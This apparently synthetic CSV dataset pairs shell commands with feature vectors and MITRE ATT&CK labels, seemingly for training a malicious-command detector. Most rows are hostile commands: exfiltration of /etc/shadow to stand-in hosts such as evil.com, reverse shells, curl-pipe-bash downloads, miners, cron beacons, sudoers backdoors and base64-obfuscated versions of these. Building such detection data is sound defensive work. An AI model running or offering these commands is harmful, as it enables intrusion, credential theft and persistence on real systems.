unshadow /etc/passwd /etc/shadow > crackme,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
time wmiexec.py domain/admin:pass@10.0.0.5 ; chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'c2VjcmV0c2R1bXAucHkgLWp1c3QtZGMtdXNlciBBZG1pbmlzdHJhdG9yIGRvbWFpbi91c2VyOnBhc3NAREM=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""wget --post-file=/etc/passwd http://attacker.com/receive""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'ZnBpbmcgLWEgLWcgMTkyLjE2OC4xLjAvMjQgMj4vZGV2L251bGw=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""nbtscan 192.168.1.0/24""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
grep -r 'error' /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
"python3 -c 'import socket,subprocess,os;...'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'c3lzdGVtY3RsIGVuYWJsZSAtLW5vdyBtYWxpY2lvdXMuc2VydmljZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
time uname -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1082_System_Information_Discovery'],synthetic
lsb_release -a && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 1]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""$env:cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA'))""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
git clone https://github.com/user/repo.git,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
"bash -c ""ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1087_Account_Discovery'],synthetic
echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlcg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
time nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
echo 'Y2F0IC9wcm9jL3ZlcnNpb24gJiYgZWNobyBkb25l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""uname -a && sleep 1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Y3VybCAtWCBQT1NUIGh0dHA6Ly9ldmlsLmNvbS9jb2xsZWN0IC1kIEAvZXRjL3NoYWRvdyA7IGVjaG8gZG9uZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'd2dldCAtcSAtTy0gLS1oZWFkZXI9J1gtQXV0aDogdG9rZW4xMjMnIGh0dHA6Ly9ldmlsLmNvbS9jbWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
ln  -s  /tmp/backdoor.sh  /etc/cron.d/system-update,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
echo  'bm1hcCAtc1YgLS12ZXJzaW9uLWludGVuc2l0eSA1IC1wIDEtNjU1MzUgMTAuMC4wLjE='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd | > /dev/null 2>&1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c 'import socket,subprocess,os;...'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"python3 -c ""import subprocess; subprocess.run(['cat','/etc/shadow'])""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
nohup ip link show ; sleep 1 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
su - admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
nohup echo 'Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAtdiBub2xvZ2lu' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
unshadow /etc/passwd /etc/shadow > crackme,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
echo 'Li9kaXJ0eWNvdyAvZXRjL3Bhc3N3ZCAncm9vdDo6MDowOnJvb3Q6L3Jvb3Q6L2Jpbi9iYXNoJyAmJiBoaXN0b3J5IC1j' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh && sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
apt-get update,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
echo  'Li9DVkUtMjAyMS00MDM0'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
uname -a | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1053_Scheduled_Task'],synthetic
"bash -c ""echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlcg==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup fping -a -g 192.168.1.0/24 2>/dev/null &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
"bash -c ""ssh admin@localhost""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
find /home -name '*.conf',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo  '@reboot  /tmp/backdoor.sh'  |  crontab  -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
"bash -c ""service apache2 status""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
nohup echo 'Y3VybCAtcyBodHRwOi8vYzIuYXR0YWNrZXIuY29tL2JlYWNvbg==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'c3VkbyAtdSB3d3ctZGF0YSBiYXNo' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'cHNleGVjLnB5IEFkbWluaXN0cmF0b3I6cGFzc3dvcmRAMTAuMC4wLjUgY21kLmV4ZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZQ=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
rm -rf /tmp/* /var/tmp/*,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
wget http://attacker.com/payload -O /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
route  -n  |  chmod  +x  /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
echo 'ZWNobyAtZSAnXHgyZlx4NjJceDY5XHg2ZVx4MmZceDYyXHg2MVx4NzNceDY4Jw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
ip route show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"bash -c ""runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1078_Valid_Accounts'],synthetic
unshadow  /etc/passwd  /etc/shadow  >  crackme  ;  history  -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
cat  /etc/passwd  |  grep  -v  nologin  |  grep  -v  false,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.4, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
unshadow /etc/passwd /etc/shadow > crackme && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
"bash -c ""find / -perm -4000 -type f 2>/dev/null""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers && echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'aWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo find / -writable -type d 2>/dev/null,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
time w | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wmic useraccount list ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
id  -u,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
nohup echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3htcmlnIHwgYmFzaA==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
time find / -perm -4000 -type f 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
ssh admin@localhost | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo  'ZWNobyAnQHJlYm9vdCAvdG1wL2JhY2tkb29yLnNoJyB8IGNyb250YWIgLQ=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
"python3 -c 'import socket,subprocess,os;...'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"bash -c ""mkdir -p /opt/myapp""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
ssh  -L  8080:internal:80  user@jump.host,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
arp-scan --localnet,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget --post-file=/etc/passwd http://attacker.com/receive,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
nohup echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68' ; chmod +x /tmp/payload &,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0.0, 0.36, 1, 1]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/network/interfaces,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo  'aG9zdG5hbWVjdGw='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
time id -u,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
wmiexec.py domain/admin:pass@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1021_Remote_Services'],synthetic
find / -name 'id_rsa' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1136_Create_Account'],synthetic
sudo echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
"bash -c ""New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' ; sleep 1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
arp-scan --localnet,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
su - admin && chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
echo 'Z2V0ZW50IHBhc3N3ZCB8IGdyZXAgLXYgbm9sb2dpbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
dmesg | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['T1082_System_Information_Discovery'],synthetic
"bash -c ""systemctl enable --now malicious.service && chmod +x /tmp/payload""","[0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 1]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
$env:cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')) | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
id -u,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
nmcli connection show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
